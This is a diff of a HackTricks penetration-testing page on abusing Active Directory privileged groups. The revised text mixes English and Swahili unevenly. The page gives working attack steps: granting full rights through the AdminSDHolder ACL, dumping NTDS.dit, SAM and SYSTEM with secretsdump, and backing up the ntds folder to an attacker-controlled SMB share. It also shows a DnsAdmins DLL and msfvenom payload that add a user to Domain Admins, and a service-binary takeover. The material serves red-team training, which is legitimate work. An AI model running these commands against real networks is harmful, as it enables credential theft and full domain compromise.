@@ -1,80 +1,81 @@
-# Vikundi vya Wenye Mamlaka
+# Privileged Groups
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Vikundi Maarufu vyenye Mamlaka ya Utawala
+## Well Known groups with administration privileges
 
-* **Waadiministrators**
-* **Waadamin wa Kikoa**
-* **Waadamin wa Kampuni**
+* **Wasimamizi**
+* **Wasimamizi wa Kikoa**
+* **Wasimamizi wa Biashara**
 
-## Waendeshaji wa Akaunti
+## Account Operators
 
-Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo sio waadiministrators kwenye kikoa. Aidha, kinawezesha kuingia kwa ndani kwenye Kudhibiti Kikoa (DC).
+Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Zaidi ya hayo, kinaruhusu kuingia kwa ndani kwenye Kituo cha Kikoa (DC).
 
-Ili kutambua wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
+Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwa ndani kwenye DC01.
+Adding new users is permitted, as well as local login to DC01.
 
-## Kikundi cha AdminSDHolder
+## AdminSDHolder group
 
-Orodha ya Udhibiti wa Upatikanaji (ACL) ya kikundi cha **AdminSDHolder** ni muhimu kwani inaweka ruhusa kwa "vikundi vilivyolindwa" vyote ndani ya Active Directory, ikiwa ni pamoja na vikundi vya hali ya juu. Mfumo huu unahakikisha usalama wa vikundi hivi kwa kuzuia mabadiliko yasiyoruhusiwa.
+The **AdminSDHolder** group's Access Control List (ACL) ni muhimu kwani inaweka ruhusa kwa "makundi yaliyolindwa" ndani ya Active Directory, ikiwa ni pamoja na makundi yenye mamlaka ya juu. Mekanismu hii inahakikisha usalama wa makundi haya kwa kuzuia mabadiliko yasiyoruhusiwa.
 
-Mshambuliaji anaweza kutumia hili kwa kubadilisha ACL ya kikundi cha **AdminSDHolder**, kutoa ruhusa kamili kwa mtumiaji wa kawaida. Hii itampa mtumiaji huyo udhibiti kamili juu ya vikundi vyote vilivyolindwa. Ikiwa ruhusa za mtumiaji huyu zimebadilishwa au kuondolewa, zitarudishwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.
+Mshambuliaji anaweza kutumia hii kwa kubadilisha ACL ya **AdminSDHolder** kundi, akitoa ruhusa kamili kwa mtumiaji wa kawaida. Hii itampa mtumiaji huyo udhibiti kamili juu ya makundi yote yaliyolindwa. Ikiwa ruhusa za mtumiaji huyu zitabadilishwa au kuondolewa, zitarudishwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.
 
-Amri za kukagua wanachama na kubadilisha ruhusa ni:
+Commands to review the members and modify permissions include:
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-Kuna skripti inapatikana kuharakisha mchakato wa kurejesha: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
-Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
 ## AD Recycle Bin
 
-Uanachama katika kikundi hiki unaruhusu kusoma vitu vilivyofutwa katika Active Directory, ambavyo vinaweza kufichua habari nyeti:
+Uanachama katika kundi hili unaruhusu kusoma vitu vilivyofutwa vya Active Directory, ambavyo vinaweza kufichua taarifa nyeti:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-### Upatikanaji wa Msimamizi wa Kikoa
+### Domain Controller Access
 
-Upatikanaji wa faili kwenye DC umefungwa isipokuwa mtumiaji ni sehemu ya kikundi cha `Server Operators`, ambacho hubadilisha kiwango cha upatikanaji.
+Upatikanaji wa faili kwenye DC umepunguziliwa mbali isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha upatikanaji.
 
-### Kuongeza Uwezo wa Haki
+### Privilege Escalation
 
-Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kurekebisha ruhusa za huduma. Kikundi cha `Server Operators`, kwa mfano, kina udhibiti kamili juu ya huduma fulani, kuruhusu utekelezaji wa amri za kiholela na kuongeza uwezo wa haki.
+Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, kuruhusu utekelezaji wa amri zisizo na mipaka na kupandisha hadhi:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-Amri hii inaonyesha kuwa `Server Operators` wana ufikiaji kamili, kuruhusu ujanja wa huduma kwa mamlaka zilizoongezeka.
+Hii amri inaonyesha kwamba `Server Operators` wana ufikiaji kamili, ikiruhusu usimamizi wa huduma kwa ajili ya haki za juu.
 
-## Waendeshaji wa Nakala za Hifadhi
+## Backup Operators
 
-Uanachama katika kikundi cha `Backup Operators` hutoa ufikiaji kwa mfumo wa faili wa `DC01` kutokana na mamlaka za `SeBackup` na `SeRestore`. Mamlaka hizi huruhusu uwezo wa kupitisha folda, kuorodhesha, na kunakili faili, hata bila idhini wazi, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia hati maalum ni muhimu kwa mchakato huu.
+Uanachama katika kundi la `Backup Operators` unatoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na haki za `SeBackup` na `SeRestore`. Hizi haki zinaruhusu kupita kwenye folda, kuorodhesha, na uwezo wa kunakili faili, hata bila ruhusa maalum, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia skripti maalum ni muhimu kwa mchakato huu.
 
-Ili kuorodhesha wanachama wa kikundi, tekeleza:
+Ili kuorodhesha wanachama wa kundi, tekeleza:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
-### Shambulizi la Ndani
+### Local Attack
 
-Kuimarisha mamlaka haya kwa ndani, hatua zifuatazo zinatumika:
+Ili kutumia haki hizi kwa ndani, hatua zifuatazo zinatumika:
 
 1. Ingiza maktaba muhimu:
 ```bash
@@ -86,18 +87,18 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. Pata na nakili faili kutoka kwenye folda zilizozuiwa, kwa mfano:
+3. Pata na nakili faili kutoka kwa saraka zilizozuiliwa, kwa mfano:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
-### Shambulizi la AD
+### AD Attack
 
-Upatikanaji wa moja kwa moja kwenye mfumo wa faili wa Domain Controller unaruhusu wizi wa database ya `NTDS.dit`, ambayo ina hash zote za NTLM kwa watumiaji na kompyuta za kikoa.
+Upatikanaji wa moja kwa moja wa mfumo wa faili wa Domain Controller unaruhusu wizi wa database ya `NTDS.dit`, ambayo ina hash zote za NTLM za watumiaji na kompyuta za eneo.
 
-#### Kutumia diskshadow.exe
+#### Using diskshadow.exe
 
-1. Unda nakala ya kivuli ya diski ya `C`:
+1. Tengeneza nakala ya kivuli ya diski ya `C`:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -114,23 +115,23 @@ exit
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-Badilisha, tumia `robocopy` kwa nakala ya faili:
+Kwa upande mwingine, tumia `robocopy` kwa ajili ya nakala za faili:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-3. Chukua `SYSTEM` na `SAM` ili kupata hash:
+3. Toa `SYSTEM` na `SAM` kwa ajili ya kupata hash:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-4. Pata hash zote kutoka kwenye `NTDS.dit`:
+4. Pata hash zote kutoka `NTDS.dit`:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Kutumia wbadmin.exe
 
-1. Weka mfumo wa faili wa NTFS kwa seva ya SMB kwenye kifaa cha mshambuliaji na weka siri za SMB kwenye kifaa cha lengo.
-2. Tumia `wbadmin.exe` kwa ajili ya kuhifadhi mfumo na kuchota `NTDS.dit`:
+1. Weka mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akreditivu za SMB kwenye mashine lengwa.
+2. Tumia `wbadmin.exe` kwa ajili ya nakala ya mfumo na uchimbaji wa `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
 echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
@@ -138,19 +139,19 @@ wbadmin get versions
 echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-Kwa onyesho la vitendo, angalia [VIDEO YA ONYESHO NA IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Kwa maonyesho ya vitendo, angalia [VIDEO YA DEMO NA IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-Wanachama wa kikundi cha **DnsAdmins** wanaweza kutumia mamlaka yao kuweka DLL yoyote na mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi iliyoandaliwa kwenye Wadhibiti wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa uvamizi.
+Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka yenye mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wajenzi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi.
 
-Kutaja wanachama wa kikundi cha DnsAdmins, tumia:
+Ili kuorodhesha wajumbe wa kundi la DnsAdmins, tumia:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
-### Tekeleza DLL yoyote
+### Execute arbitrary DLL
 
-Wanachama wanaweza kufanya seva ya DNS iweke DLL yoyote (kutoka kwenye kompyuta au kwenye sehemu ya mbali) kwa kutumia amri kama vile:
+Wajumbe wanaweza kufanya seva ya DNS ipakue DLL isiyo ya kawaida (iwe kwa ndani au kutoka kwa sehemu ya mbali) kwa kutumia amri kama:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -170,81 +171,81 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-Kuanzisha tena huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL iweze kupakia:
+Kuanza upya huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL iweze kupakiwa:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Kwa maelezo zaidi kuhusu njia hii ya shambulio, tazama ired.team.
+For more details on this attack vector, refer to ired.team.
 
 #### Mimilib.dll
-Pia ni rahisi kutumia mimilib.dll kwa utekelezaji wa amri, kwa kubadilisha ili itekeleze amri maalum au reverse shells. [Angalia chapisho hili](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.
+Ni rahisi pia kutumia mimilib.dll kwa ajili ya utekelezaji wa amri, kuibadilisha ili kutekeleza amri maalum au shells za kurudi. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
 
-### WPAD Rekodi kwa MitM
-DnsAdmins wanaweza kudanganya rekodi za DNS ili kufanya mashambulio ya Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kuzuia maswali ya ulimwengu. Zana kama Responder au Inveigh zinaweza kutumika kwa kudanganya na kukamata trafiki ya mtandao.
+### WPAD Record for MitM
+DnsAdmins wanaweza kubadilisha rekodi za DNS ili kufanya mashambulizi ya Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kuzuia maswali ya kimataifa. Zana kama Responder au Inveigh zinaweza kutumika kwa ajili ya kudanganya na kukamata trafiki ya mtandao.
 
-### Wasomaji wa Kumbukumbu za Matukio
-Wanachama wanaweza kupata ufikiaji wa kumbukumbu za matukio, ambapo wanaweza kupata habari nyeti kama vile nywila za wazi au maelezo ya utekelezaji wa amri:
+### Event Log Readers
+Wajumbe wanaweza kufikia kumbukumbu za matukio, huenda wakapata taarifa nyeti kama vile nywila za maandiko au maelezo ya utekelezaji wa amri:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-## Ubadilishaji wa Ruhusa za Windows za Kubadilishana
-Kikundi hiki kinaweza kubadilisha DACLs kwenye kipengele cha kikoa, kwa uwezekano wa kutoa ruhusa za DCSync. Mbinu za kuongeza mamlaka kwa kutumia kikundi hiki zimefafanuliwa kwa undani katika hazina ya GitHub ya Kubadilishana-AD-Privesc.
+## Exchange Windows Permissions
+Kikundi hiki kinaweza kubadilisha DACLs kwenye kituo cha kikoa, huenda kikatoa haki za DCSync. Mbinu za kupandisha hadhi zinazotumia kikundi hiki zimeelezewa katika repo ya Exchange-AD-Privesc ya GitHub.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
-## Wamiliki wa Hyper-V
-Wamiliki wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kudhibiti Wadhibiti wa Kikoa vilivyovirtualishwa. Hii ni pamoja na kuiga DC za moja kwa moja na kuchukua NTLM hashes kutoka faili ya NTDS.dit.
+## Wataalam wa Hyper-V
+Wataalam wa Hyper-V wana ufaccess kamili kwa Hyper-V, ambayo inaweza kutumika kupata udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
 
-### Mfano wa Udukuzi
-Mozilla Maintenance Service ya Firefox inaweza kutumiwa na Wamiliki wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiunga ngumu kwa faili ya SYSTEM iliyolindwa na kuiweka na programu mbaya:
+### Mfano wa Kutumia
+Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumika na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyolindwa na kuibadilisha na executable mbaya:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-**Maelezo: Uchunguzi wa Hard link umepunguzwa katika sasisho za hivi karibuni za Windows.**
+Note: Ukatili wa kiungo kigumu umepunguziliwa mbali katika sasisho za hivi karibuni za Windows.
 
 ## Usimamizi wa Shirika
 
-Katika mazingira ambapo **Microsoft Exchange** imeanzishwa, kuna kikundi maalum kinachojulikana kama **Usimamizi wa Shirika** ambacho kina uwezo mkubwa. Kikundi hiki kina **ruhusa ya kufikia sanduku la barua za watumiaji wote wa kikoa** na kinadumisha **udhibiti kamili juu ya Kitengo cha Shirika cha 'Microsoft Exchange Security Groups'**. Udhibiti huu ni pamoja na kikundi cha **`Exchange Windows Permissions`**, ambacho kinaweza kutumiwa kwa ajili ya kuongeza mamlaka.
+Katika mazingira ambapo **Microsoft Exchange** imewekwa, kundi maalum linalojulikana kama **Usimamizi wa Shirika** lina uwezo mkubwa. Kundi hili lina haki ya **kufikia sanduku la barua la watumiaji wote wa kikoa** na lina **udhibiti kamili juu ya 'Makundi ya Usalama ya Microsoft Exchange'** Kitengo cha Shirika (OU). Udhibiti huu unajumuisha kundi la **`Exchange Windows Permissions`**, ambalo linaweza kutumika kwa ajili ya kupandisha hadhi.
 
-### Uchumi wa Mamlaka na Amri
+### Ukatili wa Haki na Amri
 
-#### Waendeshaji wa Uchapishaji
-Wanachama wa kikundi cha **Waendeshaji wa Uchapishaji** wana haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwenye mfumo wa Domain Controller**, kuuzima, na kusimamia printers. Ili kutumia mamlaka haya, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na uwezo, ni lazima kuepuka Udhibiti wa Akaunti ya Mtumiaji (UAC).
+#### Opereta wa Print
+Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kidhibiti cha Kikoa**, kuifunga, na kusimamia printa. Ili kutumia haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na kiwango cha juu, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
 
-Kutaja wanachama wa kikundi hiki, tumia amri ifuatayo ya PowerShell:
+Ili kuorodhesha wajumbe wa kundi hili, amri ifuatayo ya PowerShell inatumika:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Kwa mbinu za kudukua zaidi zinazohusiana na **`SeLoadDriverPrivilege`**, mtu anapaswa kushauriana na rasilimali maalum za usalama.
+Kwa mbinu za kina za unyakuzi zinazohusiana na **`SeLoadDriverPrivilege`**, mtu anapaswa kutafuta rasilimali maalum za usalama.
 
-#### Watumiaji wa Mbali wa Desktop
-Wanachama wa kikundi hiki wanapewa ufikiaji kwenye PC kupitia Itifaki ya Mbali ya Desktop (RDP). Kwa kuchunguza wanachama hawa, amri za PowerShell zinapatikana:
+#### Watumiaji wa Desktop ya Kijijini
+Wajumbe wa kundi hili wanapewa ufikiaji wa PCs kupitia Protokali ya Desktop ya Kijijini (RDP). Ili kuhesabu wajumbe hawa, amri za PowerShell zinapatikana:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-Maelezo zaidi kuhusu kuchexploitisha RDP yanaweza kupatikana katika rasilimali maalum za pentesting.
+Zaidi ya ufahamu kuhusu kutumia RDP yanaweza kupatikana katika rasilimali maalum za pentesting.
 
-#### Watumiaji wa Usimamizi wa Mbali
-Wanachama wanaweza kupata kompyuta kupitia **Windows Remote Management (WinRM)**. Uchunguzi wa wanachama hawa unafanikiwa kupitia:
+#### Watumiaji wa Usimamizi wa Kijijini
+Wajumbe wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Uhesabuji wa wajumbe hawa unafanywa kupitia:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Kwa mbinu za kudukua zinazohusiana na **WinRM**, ni lazima kushauriana na hati maalum.
+Kwa mbinu za unyakuzi zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kutumika.
 
-#### Waendeshaji wa Seva
-Kikundi hiki kina ruhusa ya kufanya mabadiliko mbalimbali kwenye Wadhibiti wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha nakala, kubadilisha wakati wa mfumo, na kuzima mfumo. Ili kupata orodha ya wanachama, tumia amri ifuatayo:
+#### Wafanya Kazi wa Seva
+Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Wajibu wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo. Ili kuhesabu wanachama, amri iliyotolewa ni:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-## Marejeo <a href="#marejeo" id="marejeo"></a>
+## References <a href="#references" id="references"></a>
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 * [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
@@ -261,16 +262,17 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 * [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 * [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
